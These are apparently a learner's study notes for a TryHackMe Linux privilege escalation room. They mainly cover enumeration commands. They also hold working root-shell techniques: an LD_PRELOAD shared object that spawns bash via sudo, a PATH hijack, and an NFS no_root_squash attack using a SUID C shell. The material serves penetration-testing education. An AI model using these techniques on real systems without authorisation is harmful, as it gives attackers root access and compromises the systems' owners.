# Linux Privilege Escalation
> [TryHackMe Link](https://tryhackme.com/room/linprivesc)

## Privilege Escalation
The exploitation of a vulnerability, design flaw, or configuration oversight in an operating system or application to gain unauthorized access to resources that are usually restricted from the users. This escalation can then be used to: 
- Resetting passwords
- Bypassing access controls to compromise protected data
- Editing software configurations
- Enabling Persistence
- Changing the privilege of existing (or new) users
- Execute any administrative command

The privilege escalation process will rely on misconfigurations and lax permissions. 

## Enumeration
Even having accessed the system by exploiting a critical vulnerability that resulted in root-level access or just found a way to send commands using a low privileged account you will need to enumerate information about the target system:

### hostname
Returns the hostname of the machine. Whilst this could be a meaningless string it can sometimes reveal information about the systems role within a environment or the system running
- `Ubuntu-112`
- `SQL-PROD-01`

### uname -a
Provices system information about the kernal used by the system, which could assist in finding kernal vulnerabilities to be exploited

### /proc/version
The proc filesystem (`procfs`) provides information about the target system processes. Can be found on many different Linux flavours and looking at `/proc/version` may provide information on the kernel version and additional data such as whether a compiler (e.g. GCC) is installed. 

### /etc/issue
Usually contains some information about the operating system but can easily be customized or changed (*as can any other files containing system information*)

### /etc/passwd
Discover all users that are on the system (system, service, account):
- `cat /etc/passwd | cut -d ":" -f 1` - Returns just user names
- `cat /etc/passwd | grep home` - Returns users with a home directory as this will likely filter out service and system users

### ps Command
Lists running processes on a Linux System revealing: 
-  **PID**: The process ID (*unique to the process*)
-  **TTY**: Terminal type used by the user
-  **Time**: Amount of CPU time used by the process (t*his is NOT the time this process has been running for*)
-  **CMD**: The command or executable running (*will NOT display any command line parameter*)

Some useful commands include: 
- `ps -A`: View all running processes
- `ps axjf`: View process tree
```
      1   11415     989     989 ?             -1 S     1000   0:00 /usr/bin/xfce4-mime-helper
  11415   11416     989     989 ?             -1 Sl    1000   0:00  \_ /usr/bin/qterminal
  11416   11427   11427   11427 pts/0      11481 Ss    1000   0:00      \_ /usr/bin/zsh
  11427   11481   11481   11427 pts/0      11481 R+    1000   0:00          \_ ps axjf
```
- `ps aux`: Show processes for all users (a), display the user that launched the process (u), and show processes that are not attached to a terminal (x)

### env
Shows all environmental variables. Some variables of interest can be: 
- **HOME**: To see current user
- **PATH**: Tells the operating system where to search for executables. May have a compiler or a scripting language (e.g. Python) that could be used to run code on the target system
- **SHELL**: Tells you what shell you are running (zsh,fish,bash)

### sudo -l
Used to list all commands your user can run using sudo (target system may be configured to allow users to run some (or all) commands with root privileges)

### id <USER>
Provides a general overview of the user’s privilege level and group memberships. 

### history
Retrieve earlier commands ran which can reveal some idea about the target system and, albeit rarely, have stored information such as passwords or usernames

### ifconfig
The target system may be a pivoting point to another network. This provides  information about the network interfaces of the system. Can be paired with `ip route` to confirm which network routes exist

### netstat 
Used with several different options to gather information on existing connections
- `netstat -a`: Shows all listening ports and established connections
- `netstat -at` or `netstat -au`: Used to list TCP or UDP protocols respectively.
- `netstat -l`: List ports in “listening” mode. These ports are open and ready to accept incoming connections (can be used with the “t” option to list only ports that are listening using the TCP protocol)
- `netstat -s`: List network usage statistics by protocol (can be used with the `-t` or `-u` options to limit the output to a specific protocol
- `netstat -tp`: List connections with the service name annd PID information (can also be used with the -l option to list listening ports)
  - If PID column is empty then the process is owned by another user
- `netstat -i`: Shows interface statistics looking at RX-OK we can see activity on the network
- `netstat -ano`: **a** displays all sockets, **n** do not resolve names, **o** display timers

### find 
Searching the target system for important information and potential privilege escalation vectors. Some useful examples are: 
- `find <DIRECTORY> -name <FILE_NAME>`: find the file named “<FILE_NAME>” in the directory
- `-type d`: find a directory
- `-type f -perm 0777`: find files with the 777 permissions (*files readable, writable, and executable by all users*)
- `-perm -o x`: Find world-executable files
- `-perm a=x`: find executable files
- `-user frank`: find all files for user “frank”
- `-mtime 10`: find files that were modified in the last 10 days
- `-atime 10`: find files that were accessed in the last 10 days
- `-cmin -60`: find files changed within the last hour (60 minutes)
- `-amin -60`: find files accesses within the last hour (60 minutes)
- `-size 50M`: find files with a 50 MB size
  - Can also be used with (+) and (-) signs to specify a file that is larger or smaller than the given size

> Note: Tends to generate errors which sometimes makes the output hard to read so using `2>/dev/null` redirects errors to “/dev/null” and have a cleaner output

`find / -perm -u=s -type f 2>/dev/null` - Find files with the SUID bit, which allows us to run the file with a higher privilege level than the current user (*SUID bit allows the file to run with the privilege level of the account that owns it, rather than the account which runs it*)

## Automated Enumeration Tools
The target system’s environment will influence the tool you will be able to use: 
- [LinPeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
- [LinEnum](https://github.com/rebootuser/LinEnum) 
- [LES (Linux Exploit Suggester)](https://github.com/mzet-/linux-exploit-suggester)
- [Linux Smart Enumeration](https://github.com/diego-treitos/linux-smart-enumeration)
- [Linux Priv Checker](https://github.com/linted/linuxprivchecker)

## Kernal Exploits
The kernel on Linux systems manages the communication between components such as the memory on the system and applications: The Kernel exploit methodology is simple;
1. Identify the kernel version
2. Search and find an exploit code for the kernel version of the target system using [websites](https://www.cvedetails.com/)
3. Run the exploit 

## Sudo
Allows you to run a program with root privileges. Under some conditions, system administrators may need to give regular users some flexibility on their privileges to run certain tools or commands as root. 
- [GTFO Bins](https://gtfobins.org/) - Provides information on how any program, on which you may have sudo rights, can be used

### Leverage Application Functions
Some applications will not have a known exploit within this context. This way you can leverage a function of an application to perform an unintended action or consequence of one. 
- Apache2 has a option that supports loading alternative configuration files (-f). Loading `/etc/shadow` results in an error message that includes the first line of the shadow file

### Leverage LD_PRELOAD
LD_PRELOAD is a function that allows any program to use shared libraries.  If the "env_keep" option is enabled we can generate a shared library which will be loaded and executed before the program is run (*LD_PRELOAD option will be ignored if the real user ID is different from the effective user ID*). The steps follow:
1. Check for LD_PRELOAD (with the env_keep option)
2. Write a simple C code compiled as a share object (.so extension) file
3. Compile with `gcc -fPIC -shared -o shell.so shell.c -nostartfiles`
4. Run the program with sudo rights and the LD_PRELOAD option pointing to our .so file
```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
5. Use this shared object file when launching any program our user can run with sudo
   1. `sudo LD_PRELOAD=/home/user/ldpreload/shell.so find` 

## SUID
Linux privilege controls rely on controlling the users and files interactions done by permissions. **SUID** (Set-user Identification) and **SGID** (Set-group Identification) allow files to be executed with the permission level of the file owner or the group owner, respectively.
- These files have an “s” bit set showing their special permission leve
- `find / -type f -perm -04000 -ls 2>/dev/null` will list files that have SUID or SGID bits set
- [GTFO Bins](https://gtfobins.org/#+suid) can filter binaries known to be exploitable when the SUID bit is set

## Capabilities
Help manage privileges at a more granular level. The system administrator does not want to give this user higher privileges, they can change the capabilities of the binary. As a result, the binary would get through its task without needing a higher privilege user.
- `getcap -r / 2>/dev/null` tool to list enabled capabilities
- GTFObins has a good list of binaries that can be leveraged for privilege escalation if we find any set capabilities

## Cron Jobs
Cron jobs are used to run scripts or binaries at specific times. By default, they run with the privilege of their owners and not the current user. 
- If there is a scheduled task that runs with root privileges and we can change the script that will be run, then our script will run with root privileges (ideally a reverse shell).
- Cron job configurations are stored as crontabs (cron tables) to see the next time and date the task will run (Any user can read the file keeping system-wide cron jobs under /etc/crontab)

> **Note**: Cron jobs can still persist even after a script is deleted. If the full path of the script is not defined, cron will refer to the paths listed under the PATH variable in the /etc/crontab file. In this case, a script can be created named the same as in the job under our user’s home folder and it should be run by the cron job.

## PATH
If a folder for which a user has write permission is located in the path, you could potentially hijack an application to run a script. For any command that is not built into the shell or that is not defined with an absolute path, Linux will start searching in folders defined under PATH to find the location of the executable. 

To exploit this you will want to know: 
1. What folders are located under $PATH
2. Does your current user have write privileges for any of these folders?
3. Can you modify $PATH?
4. Is there a script/application you can start that will be affected by this vulnerability?

### Example 
If a script exists which searches for a binary called `thm` with an SUID bit set that the user can access. 
- Once executed this script will look for an executable called `thm` inside folders under PATH
- If any writable folder is listed under PATH we could create a binary named `thm` under that directory and have this script run it. As the SUID bit is set, this binary will run with root privilege
- Search for writable folders using `find / -writable 2>/dev/null`
- Comparing this with PATH to find folders the script can be added to (*subfolders under /usr are not writable*)

Adding to PATH
1. We can add paths like `/tmp` to PATH using `export PATH=/tmp:$PATH`
2. The script will now also look under the `/tmp` folder for an executable named “thm”
3. Copy `/bin/bash` as `thm` inside the `/tmp` folder
   1. `echo "/bin/bash" > thm`
   2. `chmod 777 thm`
4. What makes a privilege escalation possible within this context is that the script runs with root privileges as it has the SUID bit set

## NFS
Privilege escalation vectors are not confined to internal access. Shared folders and remote management interfaces such as SSH, Telnet or a misconfigured network shell can also help you gain root access on the target system.

NFS (Network File Sharing) configuration is kept in the `/etc/exports` file. This file is created during the NFS server installation and can usually be read by users.
- The critical element for this privilege escalation vector is the `no_root_squash` option on a file path
- By default, NFS will change the root user to nfsnobody and strip any file from operating with root privileges. If the “no_root_squash” option is present on a writable share, we can create an executable with SUID bit set and run it on the target system.

### Attack
1. Enumerate mountable shares from the attacking machine
   1. `showmount -e TARGET_IP`
2. Mount one of the “no_root_squash” shares to our attacking machine and start building our executable
   1. `mkdir /tmp/<MOUNT_POINT>`
   2. `mount -o rw TARGET_IP:/<NO_ROOT_SQUASH_FOLDER> /tmp/<MOUNT_POINT>`
3. If you can set SUID bits, a simple executable that will run /bin/bash on the target system 
   1. `int main() {setgid(0); setuid(0); system("/bin/bash"); return 0;}`
4. Compile the code and set the SUID bit
   1. `gcc nfs.c -o nfs -w`
   2. `chmod +s nfs`
   3. `ls -l nfs`
5. Both files will be present on the target system in <NO_ROOT_SQUASH_FOLDER> as we worked on the mounted share so no need for transfer. 
6. We can then use our unprivileged user to execute the code as the SUID will make it run as root